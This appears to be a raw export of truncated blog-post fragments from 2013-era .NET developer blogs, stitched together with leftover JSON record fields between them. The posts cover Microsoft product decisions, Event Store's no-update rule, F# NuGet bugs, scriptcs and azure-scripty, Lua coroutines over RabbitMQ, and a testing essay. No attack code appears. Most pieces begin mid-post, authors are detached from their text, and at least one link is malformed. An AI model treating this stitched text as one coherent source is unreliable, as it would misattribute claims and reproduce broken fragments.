Here are some of the craziest decisions I took note:</p><ul><li><strong style=\"line-height: 16px\">Windows 8 tiles and suppression of Start menu</strong><span style=\"line-height: 16px\">: This one is a really killer. While Windows 8 tiles make sense on a touch device, while we can forecast that in two years most devices running Windows will come with a touch screen, today 99% of real-world user of Windows 8 hate tiles (this number 99% is my own statistic, just by looking around me the real-world people behavior).  Not only tiles are barely practicable with a mouse, but they also are flat. Just by installing the common set of .NET dev tools and running under Windows 8 for a few months, I get hundreds of tiles randomly organized without any kind of hierarchy. There is no way I’ll take a few hours to try sort them out! I then installed a third-party Start Menu to have my Windows 8 looking like Windows 7. Unfortunately 50% of real world users (again my own statistic) are unable to <em>imagine existence/find/download/install</em>  a third-party Start Menu. The other half of users are totally stuck with their brand new PC fighting to do anything that used to be immediate under previous version of PC. Btw, some PC resellers I know just install by default a third-party Start Menu. I understand that Windows Blue will be released urgently to palliate this huge waste. But while Windows 8 is so much more superior than Windows 7 in many ways, <a href=\"http://www.reuters.com/article/2013/04/10/us-pc-data-idUSBRE93914P20130410\" target=\"_blank\">PCs sales are dropping dramatically</a>. <strong>It would have been so easy</strong> (and as far as I know everybody with a bit of common sense was fighting for that against the 1% managers with plain-power) to: 1) </span><span style=\"font-size: medium\">Propose tiles as the preference only on devices with touching screen 2) </span>Keep the Start Menu anyway.</li></ul><ul><li><strong>XBoxOne waste, even before the release</strong>: Again, some of the 1% manager were so smart that they wanted to make more money by treating gamers like idiots by keeping them captive. An internet connection was mandatory and game sharing was forbidden. Of course <a href=\"http://www.reuters.com/article/2013/06/19/us-microsoft-xbox-idUSBRE95I1MV20130619\" target=\"_blank\">they reverse their positions</a> as soon as Sony jumped on the occasion to claim that PS4 will treat gamers decently, not just like wallet. The result is that the XBoxOne brand is already strongly diminished, while I have no doubt that the XBoxOne is an awesome piece of technology conceived by thousands of ultra-smart engineers, that cost billions of dollars in R&D.</li></ul><ul><li><strong>Visual Studio release schedule</strong>: Again, some of the 1% manager thought that it’d be so cool to start <a href=\"http://blog.protegra.com/2013/06/06/visual-studio-2013/\" target=\"_blank\">releasing a new version of Visual Studio every year</a>. As a consequence VS2013 will be released in the 2013 calendar year, not even 18 months after VS2012 RTM. These guys seem to have no idea about how ISVs using VS are working. My own statistic shows that only a third of companies adopted VS2012, 12 months after RTM. VS2008 and VS2005 still represent more than 10% of VS in productions. And the largest the ISV, the more it tends to take time to upgrade to a new VS version because it takes so much energy and there are plenty of ascendant compatibility constraints around them. Having project/solution compatibility since VS2010, while good, is far from being the only parameter that ISV take account when they decide to upgrade to a new version of VS. Not only a yearly release is not suited for the bulk of users, but certainly this represents a big extra-burden for the developments team behind VS. VS releases are not anymore driven by a vision of what should be the next version, but each VS major version will just contain features that are done by the time limit, with sometime important features to be released immature, or postponed.</li></ul><p>Microsoft is loosing market shares, not because of a lack of good engineered products, but a lack of common sense.

A perfectly layered set of classes (which is not wished, but what should be approached) would be a lower triangular matrix blue, and a higher triangular matrix green.

The conversation that came out of this was very rich in architectural insight into how the event store works as well as overall event sourcing understanding so I thought that it would be worth spending a bit of time to write up where the constraint comes from.</p><h2>An Event Sourcing Perspective</h2><p>Let’s start with why you want to update an event? An event is a fact that happened at a point in time with the understanding of it from that point in time, a new understanding of the fact would be a new fact(naturally this does not apply to politicians). To update a previous event is generally a very bad idea. Many want to go back and update events to new versions, this is not the best way to handle versioning!</p><p>The prefered mechanism from an event sourcing perspective is to write a new face that supercedes the old fact. As an example I could write that event 7 is a mistake, this is a correction, I might as well put in a comment “this was due to bug #1342″ (similar to a journal entry in accounting). There are a few reasons this is a better way of handling things.</p><p>The first is my ability to look back at my history. If I were to change the fact and I look back at that point in time I have changed what it means. What about others who made decisions at that point in time? I can no longer see what it was they made decisions off of. Beyond this I might have a very valid query to ask your event streams of “how long on average does it take us to find bugs in previous events”.</p><p>The second model leads us to two types of queries supported on event streams (as-of vs as-at).</p><p>Beyond that with Event Sourcing the updating of an event can be inherently evil. How do you update any projections that the update occured? What about other subscribers who may be listening to the streams? Any easy answer might be to replay fully all involved with the stream but this quickly falls apart.</p><p>These are the primary reasons why the Event Store does not support an update operation on an event. There are however some wonderful architectural benefits that come from this particular constraint.</p><h2>Architectural Goodness</h2><p>If we prevent an event from ever being updated, what would the cachability of that event be? Yes it would be infinite. The Event Store supports a RESTful API (ATOM). All events served from the event store have infinite cachability, what does that mean?</p><p>Imagine you have a projection updating into a SQL table that has been running for the past eight weeks. You make a change and need to restart it (replaying from event 0). When the replay occurs and it requests events from the Event Store where do they likely come from? Your hard drive! You don’t make requests to the Event Store for them.</p><p>Beyond the events being infinitely cachable if you look through our atom implementation in fact every single request we serve with the exception of the head uri (http://somewhere.com/streams/{stream}) is also infinitely cachable. In other words when you want to reread $all (say for 5m events) you will hit exactly one non-cachable request!</p><p>This is very important when we start talking about scalability and performance. The Event Store can pretty easily serve 3-5k atom requests/second on a laptop (per node in clustered version) but how many will actually get to the Event Store? In order to scale you focus on commoditized reverse proxies in front of the Event Store not scaling the Event Store itself. nginx or varnish can easily saturate your network, just drop them in front only head calls make it through (and there is even a setting per stream to allow caching for x seconds of head links).</p><p>This is often a hard lesson to learn for developers. More often than not you should not try to scale your own software but instead prefer to scale commoditized things. Building performant and scalable things is hard, the smaller the surface area the better. Which is a more complex problem a basic reverse proxy or your business domain?</p><p>This also affects performance of replays for subscribers as you can place proxies near the subscribers (local http cache is a great start!). This is especially true for say an occasionally connected system. Gmail uses this trick to provide “offlining out of the box” for web apps. Since much of the data will already be in the http cache your hits will be hitting it, in many cases you can build say a mobile app with no further support.</p><p>Over Atom if we allowed updates, NO uris could be cachable!</p><h2>This is all cool but I actually need to update!</h2><p>Occasionally there might be a valid reason why an event actually needs to be updated, I am not sure what they are but I imagine there must be some that exist. There are a few ways this can actually be done.</p><p>The generally accepted way of handling the scenario while staying within the no-update constraintis to create an entire new stream, copy all the events from the old stream (manipulating as they are copied). Then delete the old stream. This may seem like a PITA but remember all of the discussion above (especially about updating subscribers!).</p><p>Some however may be using the TCP API and are willing to take the pains and complexity that come from subscribers (you can imagine they have none). In this one case, updates would be acceptable and simpler than adding new events. We have been going back and forth on whether or not to support this. It would not be much work at all for us but I imagine that it would be misused 1000 times for every 1 time it was used reasonably. I am reminded of the examples of being able to call .NET code from a biztalk orchestration or being able to execute .NET code inside my SQL database both have valid uses but should rarely be used. Perhaps we will make a command line parameter –run-with-scissors-updates or make people build from source to enable.</p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/NnDGk0Bxa9k\" height=\"1\" width=\"1\"/>","author":"gregyoung","_id":{"$wrap":"$oid","v":993}}

We assume that the F# project system then does the wrong thing by searching for the assembly name anywhere in the GAC or the output directory rather than referencing the explicit assembly NuGet is asking it to reference.</p><p>Interestingly, it looks as if the NuGet team have attempted to code a work-around for this bug from line 22 onwards. Could this be why C# projects don’t exhibit this behaviour? Unfortunately the work around doesn’t work in the F# case. We think it’s because F# doesn’t respect assembly versions and will happily replace any requested assembly with another one so long as it’s got the same simple name. At line 33, no assemblies are found in the fsproj file because the ‘AssemblyNamesMatch’ function does an exact match using all four elements of the full assembly name (simple name, version, culture, and key) and of course the assembly that the F# project system has found and added has a different version.</p><p>So, come on F# team, pull your finger out and fix the Visual Studio F# project system. In the meantime, in my next post I’ll talk about some of things our team, and especially the excellent Michael Newton (<a href=\"https://twitter.com/mavnn\">@mavnn</a>) has been doing to try and work around these problems.</p><p><strong>Update:</strong>Micheal Newton has<a href=\"http://mikehadlow.blogspot.co.uk/2013/06/guest-post-working-around-fnuget.html\">written a guest post</a>to explain some of things we are doing to work around these problems.</p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":995}}

A while ago I posted on how you can <a href=\"http://codebetter.com/glennblock/2012/12/25/simple-bash-scripting-for-azure-cli/\">achieve</a> some script-ability just using bash tools. Basically the techniques I listed there involve piping text from command to command and using tools like grep and awk to parse the results in order to feed to the next command.</p><p>It turns out there’s another way, and one that is much closer to the kind of fidelity you an achieve with Powershell. Sound interesting? keep reading. It turns out the majority (like 99%) of our cmds can return JSON objects if you apply the –json switch.</p><p>For example if I do “azure site list –json” here’s what I get.</p><p><a href=\"http://codebetter.com/glennblock/files/2013/04/ScreenShot20130331at5.35.57PM.png\"><img title=\"Screen Shot 2013-03-31 at 5.35.57 PM\" style=\"border-left-width: 0px;border-right-width: 0px;border-bottom-width: 0px;border-top-width: 0px\" border=\"0\" alt=\"Screen Shot 2013-03-31 at 5.35.57 PM\" src=\"http://codebetter.com/glennblock/files/2013/04/ScreenShot20130331at5.35.57PM_thumb.png\" width=\"420\" height=\"283\"></a></p><p>That means that I can take that result and parse it into a JSON object which I can then easily manipulate. Potentially I could even pipe results in from one cmd to the other. I could even imagine being able to define cmds as JSON objects so that I could script out my tasks in a more object friendly fashion. I could then wrap that all up in a nice pretty box to be used by myself or others.</p><p><a href=\"http://codebetter.com/glennblock/files/2013/04/MP9004028941.jpg\"><img title=\"MP900402894[1]\" style=\"border-left-width: 0px;border-right-width: 0px;border-bottom-width: 0px;border-top-width: 0px\" border=\"0\" alt=\"MP900402894[1]\" src=\"http://codebetter.com/glennblock/files/2013/04/MP9004028941_thumb.jpg\" width=\"240\" height=\"180\"></a></p><p>And <i>that</i> is what <a href=\"https://github.com/glennblock/azure-scripty\">azure-scripty</a> is about. (Kudos to <a href=\"http://twitter.com/jpscripter\">@JpScripter </a>for reminding me I need to post.)</p><p>azure-scripty gives you a JSON oriented API that you can use within a node script for automation tasks.

REPLs are nothing new to dynamic languages but they have not really been available in C# with one exception, Mono has a great REPL. Roslyn introduces the Roslyn interactive window in VS which is also a REPL which runs in the editor.</p><p>This REPL is different than both in that it is specific for scriptcs, and like the rest of the scriptcs experience, there’ s no IDE required. Basically it combines the goodness of scriptcs (nuget) with an interactive experience. You can just install some nuget packages and type code which instantly executes. For example imagine just pulling in HttpClient and then just doing some http requests!</p><p>Below you can see I am installing the mongo nuget package. Then running scriptcs by itself and typing in some simple code to work with the package.</p><p><a href=\"http://codebetter.com/glennblock/files/2013/05/clip_image001.jpg\"><img style=\"border: 0px\" title=\"clip_image001\" alt=\"clip_image001\" src=\"http://codebetter.com/glennblock/files/2013/05/clip_image001_thumb.jpg\" width=\"534\" height=\"570\" border=\"0\" /></a></p><p>And then we have pretty error handling.</p><p><a href=\"http://codebetter.com/glennblock/files/2013/05/clip_image002.jpg\"><img style=\"border: 0px\" title=\"clip_image002\" alt=\"clip_image002\" src=\"http://codebetter.com/glennblock/files/2013/05/clip_image002_thumb.jpg\" width=\"554\" height=\"285\" border=\"0\" /></a></p><p>Thanks to the Roslyn team’s efforts layering a REPL on top was AMAZINGLY easy. The REPL part itself was like 15 lines of code! And thanks to the nuget team for even making this a remote possibility through having an awesome package ecosystem.

Present your project at our BDF special event in September.</p><p><a href=\"http://www.brightondigitalfestival.co.uk/\">Brighton Digital Festival</a>is a month long celebration of all things digital throughout September in the lovely city of Brighton. There’s absolutely loads going on, and one would need to take the whole month off work to see everything. Last year was a blast, and this year looks to be even better, with full time festival organisers and funding from the arts council.</p><p><a href=\"http://brightonalt.net/\">Brighton ALT NET</a>is a monthly meet-up for .NET developers. We’ve been going for several years now. Each month we meet up, drink beer, and geek out about the .NET framework and software development in general. For our September event we thought it would be excellent fun to join in with the Digital Festival and do something special. We want to showcase some of the brilliant things developers like you are doing in the local area; a show-and-tell of awesome if you will. If you’ve got a project you’d like to show off, something you’ve done at work, or in your spare time, get in touch with me. It can be anything from a Netduino mouse-trap to online community of traffic cone spotters.</p><p>Email me at mike-at-suteki.co.uk.</p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":998}}

A guest post by my excellent colleague Michael Newton.</p><p>Michael normally blogs at<a href=\"http://blog.mavnn.co.uk\">http://blog.mavnn.co.uk</a>and works at<a href=\"http://15below.com\">15below</a>. He’s the build manager at 15below and has developed various work arounds for the F# NuGet issues we’ve been experiencing. I’ll hand over and let him explain …</p><p>In his<a href=\"http://mikehadlow.blogspot.co.uk/2013/06/nuget-install-is-broken-with-f.html\">first post</a>Mike did an excellent job explaining the bugs we found when trying to add or update NuGet references in fsproj files.</p><p>Unfortunately, the confusion doesn’t stop there. It turns out that if you examine the NuGet code, the logic for updating project files is not in NuGet.Core (the shared dll that drives core functionality like how to unpack a nupkg file) but is re-implemented in each client. This means that you get different results if you are running commands from the command line client than if you are using the Visual Studio plugin or the hosted PowerShell console. The reason for this starts to become obvious once you realise that the command line client has no parameters for specifying which project and/or solution you are working against, whilst that information is either already available in the Visual Studio plugin or required via little dropdown boxes in the hosted PowerShell console.</p><p>So, between everyday usage, preparing<a href=\"http://blog.mavnn.co.uk/coding-hygiene-moving-from-project-references-to-nuget-dependencies/\">to move some of our project references to NuGet</a>and the needs of our continuous integration we now had the following requirements:</p><ol><li>Reliable installation of NuGet references to C#, VB.net and F# projects. Preferably with an option of doing it via the command line to help scripting the project reference to NuGet reference moves.</li><li>Reliable upgrades of NuGet references in all project types. Again, a command line option would be useful.</li><li>Reliable downgrades of NuGet references in all project types. It’s painful to try a new release/pre-release of a NuGet package across a solution and then discover that you have to manually downgrade all of the projects separately if you decide not to take the new version.</li><li>Reliable removal of NuGet references turns out to be a requirement of reliable downgrades.</li><li>Sane solution wide management of references. Due to the way project references work, we need an easy way to ensure that all of the projects in a solution use the same version of any particular NuGet reference, and to check that this will not case any version conflicts. So ideally, upgrade and downgrade commands will run against a solution.</li></ol><p>Looking at our requirements in terms of what is already handled by NuGet and what is affected by the bugs that Mike discussed last time, we get:</p><ol><li>Very buggy for F# projects, fix relies on a fix to the underlying F# project type which is probably unlikely before Visual Studio version next. Also, command line installing that adds project references is not supported in nuget.exe by design.</li><li>Again, broken for F# projects. Otherwise works.</li><li>Not supported by design in any of the NuGet clients.</li><li>Appears to work.</li><li>Not supported by NuGet.</li></ol><p>As we looked at the list, it became apparent that we were unlikely to see the F# bug fixed any time soon, and even if we did there would still be several areas of functionality that we would be missing but would help us greatly. The number of options that we needed that the mainline NuGet project does not support by design swung the balance for us from a work-around or bug patch in NuGet’s Visual Studio project handling to a full blown wrapper library.</p><p>So, the<a href=\"https://github.com/mavnn/NuGetPlus\">NuGetPlus project</a>was born. As always, the name is a misnomer. Because<a href=\"http://martinfowler.com/bliki/TwoHardThings.html\">naming things is hard</a>. But the idea is to build a NuGet wrapper that provides the functionality above, and as a bonus extra for both us and the F# community, does not exhibit the annoying F# bugs from the previous post. Because the command line exe in NuGetPlus is only a very thin wrapper around the dll, it also allows you to easily call into the process from code and achieve results the same as running the command line program without having to write 100s of lines of supporting boiler plate. For those of you who have tried to use NuGet.Core directly, you’ll know that it’s a bit of an exercise in frustration actually mimicking the full behaviour of any of the clients.</p><p>It is very much still a work in progress. For example, it respects nuget.config files, but at the moment only makes use of the repository path and source list config options – we haven’t checked if we need to be supporting more. But it covers scenarios 1-4 above nicely, and we’re hoping to add 5 (solution level upgrade, downgrade and checking) fairly shortly. Although it has been developed on work time as functionality we desperately need in house, it is also a fully open source MIT licensed project that we are more than happy to receive pull requests for if there is functionality the community needs.</p><p>So whether you’re a F# NuGet user, or you just see the value of the additional functionality above, take it for a spin and let us know what you think.</p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":1003}}

I was talking this over at last Tuesday’s<a href=\"http://brightonalt.net/\">Brighton ALT NET</a>when<a href=\"https://twitter.com/jaykannan\">Jay Kannan</a>, who’s a game developer amongst other things, mentioned that<a href=\"http://www.lua.org/\">Lua</a>is a popular choice for scripting game platforms. Maybe I should check it out. So I did. And it turns out to be very interesting.</p><p>If you haven’t heard of Lua, it’s a “powerful, fast, lightweight, embeddable scripting language” originally conceived by a team at the Catholic University of Rio de Janeiro in Brazil. It’s the leading scripting language for game platforms and also pops up in other interesting locations including Photoshop and<a href=\"http://blog.wikimedia.org/2013/03/14/what-lua-scripting-means-wikimedia-open-source/\">Wikipedia</a>. It’s got a straightforward C API that makes it relatively simple to p-invoke from .NET, and indeed there’s a<a href=\"http://luaforge.net/projects/luainterface/\">LuaInterface</a>library that provides a managed API.</p><p>I got the source code from the<a href=\"https://code.google.com/p/luainterface/\">Google code svn repository</a>and built it in VS 2012, but there are NuGet packages available as well.</p><p>It turned out to be very simple to use Lua to script a distributed workflow. Lua has<a href=\"http://www.lua.org/manual/5.2/manual.html#2.6\">first class coroutines</a>which means that you can pause and continue a Lua script at will. The LuaInterface library allows you inject C# functions and call them as Lua functions, so it’s simply a case of calling an asynchronous C# ‘begin’ function, suspending the script by yielding the coroutine, waiting for the asynchronous function to return, setting the return value, and starting up the script again.</p><p>Let me show you how.</p><p>First here’s a little Lua script:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">a = 5<br />b = 6<br /><br />print(<span style=\"color: #006080\">'doing remote add ...'</span>)<br /><br />r1 = remoteAdd(a, b)<br /><br />print(<span style=\"color: #006080\">'doing remote multiply ...'</span>)<br /><br />r2 = remoteMultiply(r1, 4)<br /><br />print(<span style=\"color: #006080\">'doing remote divide ...'</span>)<br /><br />r3 = remoteDivide(r2, 2)<br /><br />print(r3)</pre><br /></div><p>The three functions ‘remoteAdd’, ‘remoteMultiply’ and ‘remoteDivide’ are all asynchronous. Behind the scenes a message is sent via RabbitMQ to a remote OperationServer where the calculation is carried out and a message is returned.</p><p>The script runs in my LuaRuntime class. This creates and sets up the Lua environment that the script runs in:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span style=\"color: #0000ff\">public</span><span style=\"color: #0000ff\">class</span>LuaRuntime : IDisposable<br />{<br /><span style=\"color: #0000ff\">private</span><span style=\"color: #0000ff\">readonly</span>Lua lua =<span style=\"color: #0000ff\">new</span>Lua();<br /><span style=\"color: #0000ff\">private</span><span style=\"color: #0000ff\">readonly</span>Functions functions =<span style=\"color: #0000ff\">new</span>Functions();<br /><br /><span style=\"color: #0000ff\">public</span>LuaRuntime()<br />{<br />lua.RegisterFunction(<span style=\"color: #006080\">\"print\"</span>, functions,<span style=\"color: #0000ff\">typeof</span>(Functions).GetMethod(<span style=\"color: #006080\">\"Print\"</span>));<br />lua.RegisterFunction(<span style=\"color: #006080\">\"startOperation\"</span>,<span style=\"color: #0000ff\">this</span>, GetType().GetMethod(<span style=\"color: #006080\">\"StartOperation\"</span>));<br /><br />lua.DoString(<br /><span style=\"color: #006080\">@\"<br />function remoteAdd(a, b) return remoteOperation(a, b, '+'); end<br />function remoteMultiply(a, b) return remoteOperation(a, b, '*'); end<br />function remoteDivide(a, b) return remoteOperation(a, b, '/'); end<br /><br />function remoteOperation(a, b, op)<br />startOperation(a, b, op)<br />local cor = coroutine.running()<br />coroutine.yield(cor)<br /><br />return LUA_RUNTIME_OPERATION_RESULT<br />end<br />\"</span>);<br />}<br /><br /><span style=\"color: #0000ff\">public</span><span style=\"color: #0000ff\">void</span>StartOperation(<span style=\"color: #0000ff\">int</span>a,<span style=\"color: #0000ff\">int</span>b,<span style=\"color: #0000ff\">string</span>operation)<br />{<br />functions.RunOperation(a, b, operation, result =&gt;<br />{<br />lua[<span style=\"color: #006080\">\"LUA_RUNTIME_OPERATION_RESULT\"</span>] = result;<br />lua.DoString(<span style=\"color: #006080\">\"coroutine.resume(co)\"</span>);<br />});<br />}<br /><br /><span style=\"color: #0000ff\">public</span><span style=\"color: #0000ff\">void</span>Execute(<span style=\"color: #0000ff\">string</span>script)<br />{<br /><span style=\"color: #0000ff\">const</span><span style=\"color: #0000ff\">string</span>coroutineWrapper =<br /><span style=\"color: #006080\">@\"co = coroutine.create(function()<br />{0}<br />end)\"</span>;<br />lua.DoString(<span style=\"color: #0000ff\">string</span>.Format(coroutineWrapper, script));<br />lua.DoString(<span style=\"color: #006080\">\"coroutine.resume(co)\"</span>);<br />}<br /><br /><span style=\"color: #0000ff\">public</span><span style=\"color: #0000ff\">void</span>Dispose()<br />{<br />lua.Dispose();<br />functions.Dispose();<br />}<br />}</pre><br /></div><p>When this class is instantiated it creates a new LuaInterface environment (the Lua class) and a new instance of a Functions class that I’ll explain below.</p><p>The constructor is where most of the interesting setup happens. First we register two C# functions that we want to call from inside Lua: ‘print’ which simply prints from the console, and ‘startOperation’ which starts an asynchronous math operation.</p><p>Next we define our three functions: ‘remoteAdd’, ‘remoteMultiply’ and ‘remoteDivide’ which all in turn invoke a common function ‘remoteOperation’. RemoteOperation calls the registered C# function ‘startOperation’ then yields the currently running coroutine. Effectively the script will stop here until it’s started again. After it starts, the result of the asynchronous operation is accessed from the  LUA_RUNTIME_OPERATION_RESULT variable and returned to the caller.</p><p>The C# function StartOperation calls RunOperation on our Functions class which has an asynchronous callback. In the callback we set the result value in the Lua environment and execute ‘coroutine.resume’ which restarts the Lua script at the point where it yielded.</p><p>The Execute function actually runs the script. First it embeds it in a ‘coroutine.create’ call so that the entire script is created as a coroutine, then it simply starts the coroutine by calling ‘coroutine.resume’.</p><p>The Functions class is just a wrapper around a function that maintains an<a href=\"http://easynetq.com\">EasyNetQ</a>connection to RabbitMQ and makes an EasyNetQ request to a remote server somewhere else on the network.</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span style=\"color: #0000ff\">public</span><span style=\"color: #0000ff\">class</span>Functions : IDisposable<br />{<br /><span style=\"color: #0000ff\">private</span><span style=\"color: #0000ff\">readonly</span>IBus bus;<br /><br /><span style=\"color: #0000ff\">public</span>Functions()<br />{<br />bus = RabbitHutch.CreateBus(<span style=\"color: #006080\">\"host=localhost\"</span>);<br />}<br /><br /><span style=\"color: #0000ff\">public</span><span style=\"color: #0000ff\">void</span>Dispose()<br />{<br />bus.Dispose();<br />}<br /><br /><span style=\"color: #0000ff\">public</span><span style=\"color: #0000ff\">void</span>RunOperation(<span style=\"color: #0000ff\">int</span>a,<span style=\"color: #0000ff\">int</span>b,<span style=\"color: #0000ff\">string</span>operation, Action&lt;<span style=\"color: #0000ff\">int</span>&gt; resultCallback)<br />{<br /><span style=\"color: #0000ff\">using</span>(var channel = bus.OpenPublishChannel())<br />{<br />var request =<span style=\"color: #0000ff\">new</span>OperationRequest()<br />{<br />A = a,<br />B = b,<br />Operation = operation<br />};<br />channel.Request&lt;OperationRequest, OperationResponse&gt;(request, response =&gt;<br />{<br />Console.WriteLine(<span style=\"color: #006080\">\"Got response {0}\"</span>, response.Result);<br />resultCallback(response.Result);<br />});<br />}<br />}<br /><br /><span style=\"color: #0000ff\">public</span><span style=\"color: #0000ff\">void</span>Print(<span style=\"color: #0000ff\">string</span>msg)<br />{<br />Console.WriteLine(<span style=\"color: #006080\">\"LUA&gt; {0}\"</span>, msg);<br />}<br />}</pre></div><div> </div><div>Here’s a sample run of the script:</div><div> </div><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">DEBUG: Trying to connect<br />DEBUG: OnConnected<span style=\"color: #0000ff\">event</span>fired<br />INFO: Connected to RabbitMQ.

Some people are practicing TDD, but I think that’s only 46 people in the world and <a href=\"http://http//poll.pollcode.com/pdolm_result?v\">they all follow my twitter feed</a>.</p><p>&lt;/attention-seeking-headlines&gt;</p><p>We all know the common issues people have with writing large test harnesses around systems: it seems to take a long time, existing code is difficult to test, subsequent changes to code makes a lot of existing tests fail or become redundant, and the test harnesses often can become brittle, in no small part because of the abusive use of mocking.</p><p>As a recovering TDD addict, I used to tell people, like many others do, that the issue with their TDD was that they didn’t do it right. If TDD is too hard, do more TDD! In other words, if it hurts, just bang that leg with that baseball bat a bit harder, eventually you will not hurt anymore.</p><p>I will come straight out with it: this approach to unit, integration and tdd testing has, by far and large, failed. It’s over. It is time to move on. I have, and I now do <strong>VE</strong>rtical <strong>S</strong>lice <strong>T</strong>esting.</p><h2>A law of diminishing returns</h2><p>Whatever your test coverage, there is a point where more tests don’t equate more quality. Actually, let me be entirely honest here, I do not believe that a good test harness leads to better perceived quality software for your <strong>users</strong>.</p><p>The people you are trying to please with a good test harness are the ones using your system that are not on a high bandwidth medium with you. Usually that would be your team. To reduce the risk of them experiencing issues, and to increase the chance of them liking your software, you write tests so that their experience is positive.</p><p>A long time ago, I realized that testing everything is not always feasible for me, and I practice TDD all the time. A quick mental review of the teams I worked with in the last 12 years I’ve been practicing TDD also tells me that this fact is rather general.</p><h2>Mocking considered evil</h2><p>I’ve never been a big fan of mocking frameworks, for one simple reason. Simple stubbing relies on assumptions on the functioning of the mocked part of your system that rarely match reality, for no one is going to look at all the documentation of an API and decompile the code when writing a one-line stub.</p><p>As you progress in your implementation, you may learn about more scenarios you didn’t cover, and provided you are in that tiny little fraction of a percent of people refactoring your test harness as you progress your implementation, you may feedback some of that knowledge in previous tests you wrote and in your test doubles, while caressing your pet unicorn and enjoying a bit of sunshine on planet <a href=\"http://mlp.wikia.com/wiki/Equestria\">Equestria</a>. Or if you’re like the rest of us, you probably won’t.</p><h2>Increasing returns for user interfaces</h2><p>Admitting to myself that I could not fix those problems (<em>you cant fix stupid!)</em>, I started trying to understand how I could bring some of the TDD practices I enjoyed (fast feedback, repeatable tests, etc) while increasing the perception of quality, leaving any theoretical or coverage notions behind me. Instead of starting from the components I want to put under test, I start with what my users, hum, <strong>use</strong>.</p><p>If I provide users with an API, I will start by the API that I decide to publish, and consider everything else implementation details. I will only document and polish, a.k.a. test, what <strong>other people</strong> may use.</p><p>All the same, if my user interface is not an API, but some sort of UI, there is very little reason to care about all the scenarios a component may face that <strong>cannot</strong> be triggered from that user interface.</p><p>The process of discovering your user interface has an added advantage. The answer to most <em>but what if</em> questions about such a top-down approach usually unveils an additional user interface you didn’t quite know you had (looking at you, JSON SPA AJAX <em>&lt;insert buzz word of the day&gt;</em> Frankenstein “web” apps).</p><p>This is already an understood concept, and is usually referred to as acceptance testing.</p><h2>At warp speed, everything is relative</h2><p>A common issue arises from using existing acceptance-driven tools. Automating the browser is slow, automating a DB is as well, so is the file system. Each of those may also fail for reasons that have nothing to do with your code.</p><p>That would make your tests brittle and slow, which inexorably will lead to longer feedback cycles, harder to run tests, which would get us straight back to my introduction and why traditional approaches to TDD have failed.</p><p>Acceptance testing recommends, to avoid such a problem, the creation of an alternative interface allowing you to remove the browser from the equation. This is no longer necessary. With tools such as <a href=\"http://zombie.labnotes.org/\">zombie</a> being available for free, you can run an in-memory browser that behaves like a browser, runs in-memory and is increadibly fast. No more Selenium issues on running your automated test suite, no interaction with your operating system’s UI library, it’s all fast and beautiful. And if your user interface is an API, unit testing frameworks and test runners have provided those advantages for many, many years.</p><p><strong>External-facing</strong> components are now in-memory, making executing our tests fast and reliable by not triggering external systems.</p><p>I now apply the same concept to <strong>internal facing components.</strong> Instead of mocking out the inner-most elements, such as the file system, the network or a database, of my system on a per-method or per-component basis, I use libraries that give me, out of the box, an in-memory version of their system that is <strong>functionally equivalent</strong> to the real one.</p><p>It means an in-memory file system would implement the same locking primitives as the real systems, the same rules around reading, writing or seeking data, and be as close as the author of the library can make it to the real system.</p><p>In other words, a VEST-friendly library turns the unit tests of that library on it’s head. The component accessing external systems is developed alongside it’s test-double variant, and both are built to react, error-out and validate calls in the same way. The <strong>test double can be shipped</strong>. I don’t write the mocks, they come as part of the package.</p><p>There are many advantages to such an approach. The author of the library knows intimately the contract he provided you as part of his API. The act of providing an in-memory version means this knowledge is now expressed explicitly, forcing error conditions (which are very much part of a user interface in an API) to be accounted for.</p><p>A VEST-friendly library will usually end up testing explicit contracts in their test harness, so we go one step further. A library author can ship the test harnesses that exercise the contract they expose for all the conditions that are known to potentially exist, and once again, we turn test code into shipping code: if the author has written a test harness, and the author builds two components implementing an interface, the <strong>test harness for the explicit public interfaces can be shipped</strong>, as it’s probably already written.</p><p>I believe this process to be recursive and leading to the pit of success, as any library built using VEST in mind will naturally feed the VEST approach.</p><h2>Vertical Slice Testing</h2><p>The VEST approach replaces all external system calls by functionally equivalent stable and controlled ones, both at the outer-most layer (whatever exercises the user interface) and the inner-most one (whatever touches the low-level IO APIs).</p><p>By using VEST, I can focus on delivering web pages or components that focus on user-interaction, I can run the whole system on every test, and do it very quickly. I can change a lot of inside internal code without breaking existing testing scenarios. And should I wish to implement components replacing the ones in my libraries, I can do that without writing tests, because the test harness is already there, testing the contract for me.</p><p><em>Note: As I’m abroad and not available that much, don’t expect quick answers in the comments section but I’ll try my best. Subjects not covered but not forgotten: my team as a user, availability of VEST libraries, code samples, library author burden, brown field projects, generic crazy-talk, unicorns not being ponies, “you never worked in a team!”, “in an ideal world…”, etc.</em></p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/h8y7KreYZsc\" height=\"1\" 